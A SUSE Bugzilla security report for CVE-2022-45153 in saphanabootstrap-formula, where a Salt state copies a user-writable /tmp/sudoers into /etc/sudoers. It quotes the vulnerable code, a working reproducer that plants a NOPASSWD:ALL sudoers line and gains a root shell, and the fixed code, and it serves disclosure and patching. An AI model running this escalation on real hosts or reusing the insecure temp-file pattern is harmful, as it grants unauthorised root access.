**[saphanabootstrap-formula](/SUSE/saphanabootstrap-formula)**
Public

* [Notifications](/login?return_to=%2FSUSE%2Fsaphanabootstrap-formula) You must be signed in to change notification settings
* [Fork
  18](/login?return_to=%2FSUSE%2Fsaphanabootstrap-formula)
* [Star
   18](/login?return_to=%2FSUSE%2Fsaphanabootstrap-formula)

* [Code](/SUSE/saphanabootstrap-formula)
* [Issues
  4](/SUSE/saphanabootstrap-formula/issues)
* [Pull requests
  0](/SUSE/saphanabootstrap-formula/pulls)
* [Actions](/SUSE/saphanabootstrap-formula/actions)
* [Projects
  0](/SUSE/saphanabootstrap-formula/projects)
* [Security](/SUSE/saphanabootstrap-formula/security)
* [Insights](/SUSE/saphanabootstrap-formula/pulse)

Additional navigation options

* [Code](/SUSE/saphanabootstrap-formula)
* [Issues](/SUSE/saphanabootstrap-formula/issues)
* [Pull requests](/SUSE/saphanabootstrap-formula/pulls)
* [Actions](/SUSE/saphanabootstrap-formula/actions)
* [Projects](/SUSE/saphanabootstrap-formula/projects)
* [Security](/SUSE/saphanabootstrap-formula/security)
* [Insights](/SUSE/saphanabootstrap-formula/pulse)

## Footer

© 2025 GitHub, Inc.

### Footer navigation

* [Terms](https://docs.github.com/site-policy/github-terms/github-terms-of-service)
* [Privacy](https://docs.github.com/site-policy/privacy-policies/github-privacy-statement)
* [Security](https://github.com/security)
* [Status](https://www.githubstatus.com/)
* [Docs](https://docs.github.com/)
* [Contact](https://support.github.com?tags=dotcom-footer)
* Manage cookies
* Do not share my personal information

You can’t perform that action at this time.



=== Content from bugzilla.suse.com_cd7e0589_20250114_224526.html ===


| Bugzilla – Bug 1205990 | VUL-0: CVE-2022-45153: saphanabootstrap-formula: Escalation to root for arbitrary users in hana/ha\_cluster.sls | Last modified: 2023-10-31 12:20:25 UTC |
| --- | --- | --- |

|  |
| --- |

* [Home](./)
* | [New](enter_bug.cgi)
* | [Browse](describecomponents.cgi)
* | [Search](query.cgi)
* |

  [[?]](page.cgi?id=quicksearch.html "Quicksearch Help")
* | [Reports](report.cgi)
* |
  [Requests](request.cgi)
* |
  [IDP Log In](/saml2_login.cgi?idp=IDP&target=show_bug.cgi%3Fid%3D1205990)
* |
  [Forgot Password](https://idp-portal.suse.com/univention/self-service/#page=passwordreset)

[**Bug 1205990**](show_bug.cgi?id=1205990)
(CVE-2022-45153)
- VUL-0: CVE-2022-45153: saphanabootstrap-formula: Escalation to root for arbitrary users in hana/ha\_cluster.sls

[Summary:](page.cgi?id=glossary.html#short_desc "The bug summary is a short sentence which succinctly describes what the bug is about.")
VUL-0: CVE-2022-45153: saphanabootstrap-formula: Escalation to root for arbit...

| | [Status](page.cgi?id=status_resolution_matrix.html): | RESOLVED FIXED | | --- | --- | |  | | | [Alias:](page.cgi?id=glossary.html#alias "A short, unique name assigned to a bug in order to assist with looking it up and referring to it in other places in Bugzilla.") | CVE-2022-45153 | |  | | | [Product:](describecomponents.cgi "Bugs are categorised into Products and Components. Select a Classification to narrow down this list.") | SUSE Security Incidents | | [Classification:](page.cgi?id=glossary.html#classification "Bugs are categorised into Classifications, Products and Components. classifications is the top-level categorisation.") | Novell Products | | [Component:](describecomponents.cgi?product=SUSE Security Incidents "Components are second-level categories; each belongs to a particular Product. Select a Product to narrow down this list.") | Incidents ([show other bugs](buglist.cgi?component=Incidents&product=SUSE%20Security%20Incidents&bug_status=__open__)) | | [Version:](page.cgi?id=glossary.html#version "The version field defines the version of the software the bug was found in.") | unspecified | | [Hardware:](page.cgi?id=glossary.html#rep_platform "The hardware platform the bug was observed on. Note: When searching, selecting the option \"All\" only finds bugs whose value for this field is literally the word \"All\".") | Other Other | |  | | | [Priority](page.cgi?id=glossary.html#priority): | P3 - Medium **Severity**: Normal | | [Target Milestone:](page.cgi?id=glossary.html#target_milestone "The Target Milestone field is used to define when the engineer the bug is assigned to expects to fix it.") | --- | | [Assignee:](page.cgi?id=glossary.html#assigned_to "The person in charge of resolving the bug.") | Shapbot Shapbotson | | [QA Contact:](page.cgi?id=glossary.html#qa_contact "The person responsible for confirming this bug if it is unconfirmed, and for verifying the fix once the bug has been resolved.") | Security Team bot | |  | | | [URL:](page.cgi?id=glossary.html#bug_file_loc "Bugs can have a URL associated with them - for example, a pointer to a web site where the problem is seen.") | <https://smash.suse.de/issue/349334/> | | [Whiteboard:](page.cgi?id=glossary.html#status_whiteboard "Each bug has a free-form single line text entry box for adding tags and status information.") | CVSSv3.1:SUSE:CVE-2022-45153:7.8:(AV:... | | [Keywords:](describekeywords.cgi "You can add keywords from a defined list to bugs, in order to easily identify and group them.") |  | |  | | | [Depends on:](page.cgi?id=glossary.html#dependson "The bugs listed here must be resolved before this bug can be resolved.") |  | | [Blocks:](page.cgi?id=glossary.html#blocked "This bug must be resolved before the bugs listed in this field can be resolved.") |  | |  | | Reported: | 2022-12-02 15:00 UTC by Johannes Segitz | | --- | --- | | Modified: | 2023-10-31 12:20 UTC ([History](show_activity.cgi?id=1205990)) | | CC List: | 3 users (show)  jsegitz rfrohl steven.stringer | |  | | | [See Also:](page.cgi?id=glossary.html#see_also "This allows you to refer to bugs in other installations. You can enter a URL to a bug in the 'Add Bug URLs' field to note that that bug is related to this one. You can enter multiple URLs at once by separating them with whitespace. You should normally use this field to refer to bugs in other installations. For bugs in this installation, it is better to use the Depends on and Blocks fields.") |  | | [Found By:](page.cgi?id=glossary.html#cf_foundby "A custom Drop Down field in this installation of Bugzilla.") | --- | | [Services Priority:](page.cgi?id=glossary.html#cf_nts_priority "A custom Free Text field in this installation of Bugzilla.") |  | | [Business Priority:](page.cgi?id=glossary.html#cf_biz_priority "A custom Free Text field in this installation of Bugzilla.") |  | | [Blocker:](page.cgi?id=glossary.html#cf_blocker "A custom Drop Down field in this installation of Bugzilla.") | --- | | [Marketing QA Status:](page.cgi?id=glossary.html#cf_marketing_qa_status "A custom Drop Down field in this installation of Bugzilla.") | --- | | [IT Deployment:](page.cgi?id=glossary.html#cf_it_deployment "A custom Drop Down field in this installation of Bugzilla.") | --- | |  | |  * [Clone This Bug](enter_bug.cgi?cloned_bug_id=1205990) |
| --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- |
| --- | | |

| | Attachments | | | --- | --- | | [Add an attachment](attachment.cgi?bugid=1205990&action=enter) (proposed patch, testcase, etc.) | |   | Note You need to [log in](show_bug.cgi?id=1205990&GoAheadAndLogIn=1) before you can comment on or make changes to this bug. | | --- | |  |
| --- | --- | --- | --- | --- | --- | --- |

| [Description](show_bug.cgi?id=1205990#c0)  Johannes Segitz   2022-12-02 15:00:41 UTC  ``` Problematic code in hana/ha_cluster.sls  48 # Update /etc/sudoers to allow crm operations to the sidadm  49 {% set tmp_sudoers = '/tmp/sudoers' %}  50 {% set sudoers = '/etc/sudoers' %}  51  52 sudoers_backup_{{ sap_instance }}:  53   file.copy:  54     - name: {{ tmp_sudoers }}  55     - source: {{ sudoers }}  56     - unless: cat {{ sudoers }} | grep {{ node.sid.lower() }}adm  57     - require:  58       - stop_hana_{{ sap_instance }}  59  60 sudoers_append_{{ sap_instance }}:  61   file.append:  62     - name: {{ tmp_sudoers }}  63     - text: |  64         {{ node.sid.lower() }}adm ALL=(ALL) NOPASSWD: /usr/sbin/crm_attribute -n hana_{{ node.sid.lower() }}_site_srHook_*  65     - require:  66       - sudoers_backup_{{ sap_instance }}  67  68 sudoers_check_{{ sap_instance }}:  69   cmd.run:  70     - name: /usr/sbin/visudo -c -f {{ tmp_sudoers }}  71     - require:  72       - sudoers_append_{{ sap_instance }}  73  74 sudoers_edit_{{ sap_instance }}:  75   file.copy:  76     - name: {{ sudoers }}  77     - source: {{ tmp_sudoers }}  78     - force: true  79     - require:  80       - sudoers_check_{{ sap_instance }}  81       - stop_hana_{{ sap_instance }}  /tmp/sudoers can be written by arbitrary users. According to  <https://docs.saltproject.io/en/latest/ref/states/all/salt.states.file.html#salt.states.file.copy> it will not overwrite existing files. I need to reproduce it (don't have a working salt setup ATM), but every user should be able to write a arbitrary sudoers, place it there and then this will copy it into /etc  CVE assignment and reproducer next week ``` [Comment 3](show_bug.cgi?id=1205990#c3)  Steven Stringer   2022-12-05 10:11:15 UTC  ``` This issue has already been corrected and is currently awaiting release  SUSE:SLE-12-SP3:Update = IBS request 283896 SUSE:SLE-15:Update     = IBS request 283894 SUSE:SLE-15-SP2:Update = IBS request 283895 ``` [Comment 4](show_bug.cgi?id=1205990#c4)  Johannes Segitz   2022-12-05 12:21:52 UTC  ``` Thanks, but please wait with this. This needs a CVE. I'm just reproducing it and then I'll assign a CVE ``` [Comment 5](show_bug.cgi?id=1205990#c5)  Johannes Segitz   2022-12-05 12:25:08 UTC  ``` Please use CVE-2022-45153 ``` [Comment 6](show_bug.cgi?id=1205990#c6)  Johannes Segitz   2022-12-05 12:28:01 UTC  ``` Reproducer: Create stripped down sls file at /usr/share/salt-formulas/states/ha_cluster_exploit.sls  {% set tmp_sudoers = '/tmp/sudoers' %} {% set sudoers = '/etc/sudoers' %}  sudoers_backup:   file.copy:     - name: {{ tmp_sudoers }}     - source: {{ sudoers }}     - unless: cat {{ sudoers }} | grep adm  sudoers_append:   file.append:     - name: {{ tmp_sudoers }}     - text: |         adm ALL=(ALL) NOPASSWD: /usr/sbin/crm_attribute -n hana__site_srHook_*     - require:       - sudoers_backup  sudoers_check:   cmd.run:     - name: /usr/sbin/visudo -c -f {{ tmp_sudoers }}     - require:       - sudoers_append  sudoers_edit:   file.copy:     - name: {{ sudoers }}     - source: {{ tmp_sudoers }}     - force: true     - require:       - sudoers_check   as user run (change username) echo 'johannes ALL=(ALL) NOPASSWD:ALL' > /tmp/sudoers  as root: salt-call --local state.apply ha_cluster_exploit  then as user: sudo su sh-4.4# id uid=0(root) gid=0(root) groups=0(root) ``` [Comment 7](show_bug.cgi?id=1205990#c7)  Johannes Segitz   2022-12-05 12:29:27 UTC  ``` can't be exploited by the user when this ran once as /tmp/sudoers stays and the users can't overwrite it. ``` [Comment 8](show_bug.cgi?id=1205990#c8)  Steven Stringer   2022-12-05 13:51:41 UTC  ``` (In reply to Johannes Segitz from [comment #5](show_bug.cgi?id=1205990#c5)) > Please use CVE-2022-45153  Use CVE for what? ``` [Comment 9](show_bug.cgi?id=1205990#c9)  Johannes Segitz   2022-12-05 16:07:40 UTC  ``` For the changelog and for tracking this vulnerability internally and externally ``` [Comment 10](show_bug.cgi?id=1205990#c10)  Steven Stringer   2022-12-15 08:17:18 UTC  ``` Here's the new code.  A tmp file is no longer used and /etc/sudoers is no longer touched.  A new file is created (/etc/sudoers.d/SAPHanaSR).  To ensure that the new file doesn't break the sudoers config the command `/usr/sbin/visudo -c -f` is run.  ``` sudoers_create_{{ sap_instance }}:   file.managed:     - source: salt://hana/templates/ha_cluster_sudoers.j2     - name: {{ sudoers }}     - template: jinja     - user: root     - group: root     - mode: 0440     - check_cmd: /usr/sbin/visudo -c -f     - require:       - pkg: install_SAPHanaSR     - context:         sid: {{ node.sid }}         sites: {{ sites }}         sr_hook: {{ sr_hook }}         sr_hook_multi_target: {{ sr_hook_multi_target }}         sr_hook_string: __slot__:salt:file.grep({{ sr_hook }}, "^srHookGen = ").stdout         sustkover_hook: {{ sustkover_hook }} ```  Full file here -> <https://github.com/SUSE/saphanabootstrap-formula/blob/main/hana/ha_cluster.sls> ``` [Comment 11](show_bug.cgi?id=1205990#c11)  Johannes Segitz   2022-12-15 09:12:10 UTC  ``` looks good, thank you ``` [Comment 12](show_bug.cgi?id=1205990#c12)  Steven Stringer   2022-12-15 12:08:41 UTC  ``` For your reference, I've added the CVE to the changelog and resubmitted the requests into ISB.  Here are the request IDs.  SUSE:SLE-12-SP3:Update	286480 SUSE:SLE-15:Update 	286481 SUSE:SLE-15-SP2:Update	286479 ``` [Comment 14](show_bug.cgi?id=1205990#c14)  Swamp Workflow Management   2023-01-02 14:24:43 UTC  ``` SUSE-SU-2023:0011-1: An update that solves one vulnerability and has one errata is now available.  Category: security (important) Bug References: 1185643,1205990 CVE References: CVE-2022-45153 JIRA References:  Sources used: SUSE Linux Enterprise Server for SAP 12-SP5 (src):    saphanabootstrap-formula-0.13.1+git.1667812208.4db963e-4.18.1 SUSE Linux Enterprise Server for SAP 12-SP4 (src):    saphanabootstrap-formula-0.13.1+git.1667812208.4db963e-4.18.1  NOTE: This line indicates an update has been released for the listed product(s). At times this might be only a partial fix. If you have questions please reach out to maintenance coordination. ``` [Comment 15](show_bug.cgi?id=1205990#c15)  Swamp Workflow Management   2023-01-02 14:25:26 UTC  ``` SUSE-SU-2023:0010-1: An update that solves one vulnerability and has one errata is now available.  Category: security (important) Bug References: 1185643,1205990 CVE References: CVE-2022-45153 JIRA References:  Sources used: SUSE Linux Enterprise Module for SAP Applications 15-SP1 (src):    saphanabootstrap-formula-0.13.1+git.1667812208.4db963e-150000.1.19.1  NOTE: This line indicates an update has been released for the listed product(s). At times this might be only a partial fix. If you have questions please reach out to maintenance coordination. ``` [Comment 16](show_bug.cgi?id=1205990#c16)  Swamp Workflow Management   2023-01-02 14:30:39 UTC  ``` SUSE-SU-2023:0009-1: An update that solves one vulnerability and has one errata is now available.  Category: security (important) Bug References: 1185643,1205990 CVE References: CVE-2022-45153 JIRA References:  Sources used: openSUSE Leap 15.4 (src):    saphanabootstrap-formula-0.13.1+git.1667812208.4db963e-150200.3.15.1 openSUSE Leap 15.3 (src):    saphanabootstrap-formula-0.13.1+git.1667812208.4db963e-150200.3.15.1 SUSE Linux Enterprise Module for SUSE Manager Server 4.3 (src):    saphanabootstrap-formula-0.13.1+git.1667812208.4db963e-150200.3.15.1 SUSE Linux Enterprise Module for SUSE Manager Server 4.2 (src):    saphanabootstrap-formula-0.13.1+git.1667812208.4db963e-150200.3.15.1 SUSE Linux Enterprise Module for SAP Applications 15-SP4 (src):    saphanabootstrap-formula-0.13.1+git.1667812208.4db963e-150200.3.15.1 SUSE Linux Enterprise Module for SAP Applications 15-SP3 (src):    saphanabootstrap-formula-0.13.1+git.1667812208.4db963e-150200.3.15.1 SUSE Linux Enterprise Module for SAP Applications 15-SP2 (src):    saphanabootstrap-formula-0.13.1+git.1667812208.4db963e-150200.3.15.1  NOTE: This line indicates an update has been released for the listed product(s). At times this might be only a partial fix. If you have questions please reach out to maintenance coordination. ``` [Comment 17](show_bug.cgi?id=1205990#c17)  Johannes Segitz   2023-10-31 12:20:25 UTC  ``` done, thank you ``` |  |
| --- | --- |

---

* [Format For Printing](show_bug.cgi?format=multiple&id=1205990)
* - [XML](show_bug.cgi?ctype=xml&id=1205990)
* - [Clone This Bug](enter_bug.cgi?cloned_bug_id=1205990)
* - Top of page

* + [Home](./)
  + | [New](enter_bug.cgi)
  + | [Browse](describecomponents.cgi)
  + | [Search](query.cgi)
  + |

    [[?]](page.cgi?id=quicksearch.html "Quicksearch Help")
  + | [Reports](report.cgi)
  + |
    [Requests](request.cgi)
  + |
    [IDP Log In](/saml2_login.cgi?idp=IDP&target=show_bug.cgi%3Fid%3D1205990)
  + |
    [Forgot Password](https://idp-portal.suse.com/univention/self-service/#page=passwordreset)

+ Legal:
+ [openSUSE](http://en.opensuse.org/Terms_of_site)
+ [SUSE](https://www.suse.com/company/legal/)


